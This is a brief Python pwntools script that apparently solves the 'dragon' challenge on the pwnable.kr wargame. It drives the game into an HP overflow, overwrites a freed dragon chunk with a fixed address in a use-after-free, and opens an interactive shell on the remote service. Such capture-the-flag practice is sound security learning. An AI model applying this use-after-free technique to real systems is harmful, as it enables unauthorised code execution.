from pwn import *

#r = process('./dragon')
r = remote('pwnable.kr', 9004)

# Arouse Mama dragon
r.recvuntil('Knight')
r.sendline('2')
r.recvuntil('20 HP.')
r.sendline('2')
r.recvuntil('Knight')
r.sendline('1')

# overflow Mama dragon
for _ in range(4):
	r.sendline('3')
	r.sendline('3')
	r.sendline('2')
	sleep(1)

# rewrite the dragon chunk
target = 0x08048dbf
r.sendline(p32(target))

r.interactive()

